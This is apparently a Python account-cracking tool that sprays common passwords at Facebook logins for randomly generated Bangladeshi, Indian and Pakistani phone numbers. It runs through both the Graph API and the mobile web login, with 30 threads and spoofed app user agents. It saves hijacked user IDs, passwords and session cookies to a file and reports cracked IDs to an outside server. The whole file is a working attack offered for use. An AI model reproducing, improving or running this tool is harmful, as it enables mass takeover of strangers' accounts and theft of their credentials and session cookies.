"""
~/ THIS SCRIPT OPEN BY IMRAN
"""
#-------------------[ MODULE ]-------------------#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize,httpx
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-------------------[ LOOP ]-------------------#
loop = 0;oks = [];cps = [];twf = [];pcp = [];id = [];tokenku = [];plist = [];user = [];methods = []
#-------------------[ COLOR ]-------------------#
G = '\x1b[1;32m';W = '\x1b[1;97m';R = '\x1b[38;5;160m';B = '\x1b[1;90m';Y = '\x1b[1;33m';T = '\x1b[1;34m';E = '\x1b[38;5;205m';O = '\x1b[38;5;81m'
#-------------------[ STYLE ]-------------------#
xd = f'''{W}<{G}●{W}>''';xd1 = f'''{W}<{G}1{W}>''';xd2 = f'''{W}<{G}2{W}>''';xd3 = f'''{W}<{G}3{W}>''';xd0 = f'''{W}<{G}0{W}>''';xdx = f'''{W}<{G}?{W}>'''
#-------------------[ CLEAR ]-------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'''{G}{47*'-'}''')
#-------------------[ UA-1 ]-------------------#
def ___ua___():
    useragent01 = "[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125760;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/214902642;FBCR/Qlink;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/N9137;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    useragent02 = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/448014984;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_GB;FBRV/0;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955FD;FBSV/1.1.1;FBOP/8;FBCA/armeabi-v7a:armeabi;]"
    useragent03 = "[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    useragent04 = "[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022701;FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/TELCEL;FBMF/kyocera;FBBD/kyocera;FBPN/com.facebook.katana;FBDV/C6740N;FBSV/5.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    useragent05 = "[FBAN/FB4A;FBAV/149.0.0.40.71;FBBV/79007703;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/79424004;FBCR/Airtel;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/vodafone;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    useragent06 = "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323375;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_GB;FBRV/156387063;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    ___uaX___ = random.choice([useragent01,useragent02,useragent03,useragent04,useragent05,useragent06])
    return str(___uaX___)
#-------------------[ UA-2 ]-------------------#
def ____useragent____():
    ____sexua____ = ['[FBAN/FB4A;FBAV/493.0.0.72.158;FBBV/457630896;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/RMX1941;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;],','[FBAN/FB4A;FBAV/502.0.0.66.79;FBBV/459420566;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Airtel;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/RMX2189;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]']
    ____ua____ = f'''[FBAN/FB4A;FBAV/{random.randint(11, 99)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};{random.choice(____sexua____)}'''
    return ____ua____
#-------------------[ LOGO ]-------------------#
logo = (f'''
        {G}88""Yb  dP"Yb   dP""b8  dP"Yb
        {G}88__dP dP   Yb dP   `" dP   Yb
        {W}88"""  Yb   dP Yb      Yb   dP 
        {W}88      YbodP   YboodP  YbodP {G}0.0
{G}{47*'-'}
{xd} DEVELOPER : MR POCO
{xd} TOOL TYPE : RANDOM <{G}BD{W}|{G}IND{W}|{G}PAK{W}>
{G}{47*'-'}''')
#-------------------[ MAIN MENU ]-------------------#
def mrpoco():
    clear();print(f'''{xd1} BANGLADESH RANDOM CLONING ''');print(f'''{xd2} INDIA RANDOM CLONING ''');print(f'''{xd3} PAKISTAN RANDOM CLONING ''');print(f'''{xd0} EXIT TOOLS ''');linex();_p_o_c_o_s = input(f'''{xdx} SELECTION : ''')
    if _p_o_c_o_s in ['1']:______BD_______()
    elif _p_o_c_o_s in ['2']:______IND_______()
    elif _p_o_c_o_s in ['3']:______PAKISTAN_______()
    elif _p_o_c_o_s in ['0']:exit()
    else:linex();print(f'''{xd} OPTION NOT FOUND ''');linex();time.sleep(1);print(f'''{xd} TRY AGAIN ''');time.sleep(1);mrpoco()
#-------------------[ BANGLADESH ]-------------------#
def ______BD_______():
	clear();print(f'''{xd} EXAMPLE : 013 | 016 | 017 | 018 | 019 ''');linex();code = input(f'''{xdx} ENTER SIM CODE : ''');clear();print(f'''{xd} EXAMPLE : 6969 | 5555 | 7777 | 99999 ''');linex();limit = int(input(f'''{xdx} ENTER CRACK LIMIT : '''));clear();print(f'''{xd1} METHOD M1 GRAPH ''');print(f'''{xd2} METHOD M2 HOST ''');linex();____method____ = input(f'''{xdx} ENTER CRACK METHOD : ''')
	for nmbr in range(limit):nmp = ''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
	with ThreadPool(max_workers=30) as ____poco____:
		clear();tl = str(len(user))
		print(f"{xd} CODE|UID : {G}{code}{W}|{G}{limit} ");print(f"{xd} IF NO RESULT ON/OFF AIRPLANE MODE");print(f"{xd} YOUR CLONING STARTED{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}!");linex()
		for love in user:
			ids = code+love
			passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
			if ____method____ in ["1"]:____poco____.submit(__Randm_M1__,ids,passlist)
			elif ____method____ in ["2"]:____poco____.submit(__Randm_M2__,ids,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'''{xd} TOTAL OK|CP :{G} ''' + str(len(oks)) + f'''{W}|{R}''' + str(len(cps)));linex();exit()
#-------------------[ INDIA ]-------------------#
def ______IND_______():
	clear();print(f'''{xd} EXAMPLE : +91639 | +91600 | +91620 ''');linex();code = input(f'''{xdx} ENTER SIM CODE : ''');clear();print(f'''{xd} EXAMPLE : 6969 | 5555 | 7777 | 99999 ''');linex();limit = int(input(f'''{xdx} ENTER CRACK LIMIT : '''));clear();print(f'''{xd1} METHOD M1 GRAPH ''');print(f'''{xd2} METHOD M2 HOST ''');linex();____method____ = input(f'''{xdx} ENTER CRACK METHOD : ''')
	for nmbr in range(limit):nmp = ''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
	with ThreadPool(max_workers=30) as ____poco____:
		clear();tl = str(len(user))
		print(f"{xd} CODE|UID : {G}{code}{W}|{G}{limit} ");print(f"{xd} IF NO RESULT ON/OFF AIRPLANE MODE");print(f"{xd} YOUR CLONING STARTED{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}!");linex()
		for love in user:
			ids = code+love
			passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
			if ____method____ in ["1"]:____poco____.submit(__Randm_M1__,ids,passlist)
			elif ____method____ in ["2"]:____poco____.submit(__Randm_M2__,ids,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'''{xd} TOTAL OK|CP :{G} ''' + str(len(oks)) + f'''{W}|{R}''' + str(len(cps)));linex();exit()
#-------------------[ PAKISTAN ]-------------------#
def ______PAKISTAN_______():
	clear();print(f'''{xd} EXAMPLE : 0306 | 0315 | 0335 | 0345 ''');linex();code = input(f'''{xdx} ENTER SIM CODE : ''');clear();print(f'''{xd} EXAMPLE : 6969 | 5555 | 7777 | 99999 ''');linex();limit = int(input(f'''{xdx} ENTER CRACK LIMIT : '''));clear();print(f'''{xd1} METHOD M1 GRAPH ''');print(f'''{xd2} METHOD M2 HOST ''');linex();____method____ = input(f'''{xdx} ENTER CRACK METHOD : ''')
	for nmbr in range(limit):nmp = ''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
	with ThreadPool(max_workers=30) as ____poco____:
		clear();tl = str(len(user))
		print(f"{xd} CODE|UID : {G}{code}{W}|{G}{limit} ");print(f"{xd} IF NO RESULT ON/OFF AIRPLANE MODE");print(f"{xd} YOUR CLONING STARTED{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}.{W}.{G}!");linex()
		for love in user:
			ids = code+love
			passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
			if ____method____ in ["1"]:____poco____.submit(__Randm_M1__,ids,passlist)
			elif ____method____ in ["2"]:____poco____.submit(__Randm_M2__,ids,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'''{xd} TOTAL OK|CP :{G} ''' + str(len(oks)) + f'''{W}|{R}''' + str(len(cps)));linex();exit()
#-------------------[ RANDOM-M1 ]-------------------#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{xd} <{G}MRPOCO-XD{W}>/<{O}{loop}{W}>/<{G}{len(oks)}{W}>/<{R}{len(cps)}{W}> ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ___ua___(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{xd} <{G}MRPOCO-OK{W}>{G} {str(uid)} | {pas} ')
                                	print(f'\r{xd} <💥> '+coki);linex()
                                	open('/sdcard/MRPOCO-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	oks.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{xd} <{R}MRPOCO-CP{W}>{R} {str(uid)} | {pas} ')
                                open('/sdcard/MRPOCO-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-------------------[ RANDOM-M2 ]-------------------#
def __Randm_M2__(ids, passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{xd} <{G}MRPOCO-XD{W}>/<{O}{loop}{W}>/<{G}{len(oks)}{W}>/<{R}{len(cps)}{W}> ');sys.stdout.flush()
        try:
                for pas in passlist:
                        session = requests.Session()
                        free_fb = session.get('https://m.facebook.com').text
                        data = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1) if re.search('name="lsd" value="(.*?)"', str(free_fb)) else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k']),"jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1) if re.search('name="jazoest" value="(.*?)"', str(free_fb)) else str(random.randint(1000, 9000)),"m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1) if re.search('name="m_ts" value="(.*?)"', str(free_fb)) else str(int(time.time())),"li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1) if re.search('name="li" value="(.*?)"', str(free_fb)) else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06']),"try_number": "0","unrecognized_tries": "0","email": ids,"pass": pas,"login": "Log In"}
                        headers = {'authority': 'x.facebook.com',
                        'method':'GET','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'dpr': '2','sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                        'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                        'sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"',
                        'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"',
                        'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none','sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1','user-agent': ___ua___(),'viewport-width': '980',}
                        response_text = session.post("https://x.facebook.com/login/", data=data, headers=headers).text
                        log_cookies = session.cookies.get_dict()
                        if "c_user" in log_cookies:
                                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                ids = re.findall('c_user=(.*);xs', coki)[0]
                                response = requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={ids}").text
                                if "LIVE" in response:
                                	print(f'\r{xd} <{G}MRPOCO-OK{W}>{G} '+ids+' | '+pas+'\033[1;97m')
                                	print(f'\r{xd} <💥> '+coki);linex()
                                	open('/sdcard/MRPOCO-RNDM-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                	oks.append(ids)
                                	break
                                else:continue
                        elif 'checkpoint' in log_cookies:
                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                coki1 = coki.split("1000")[1]
                                ids = "1000"+coki1[0:11]
                                print(f'\r\r{xd} <{R}MRPOCO-CP{W}>{R} '+ids+' | '+pas+'\033[1;97m')
                                open('/sdcard/MRPOCO-RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                                cps.append(ids)
                                break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-------------------[ END ]-------------------#
if __name__ == "__main__":
    mrpoco()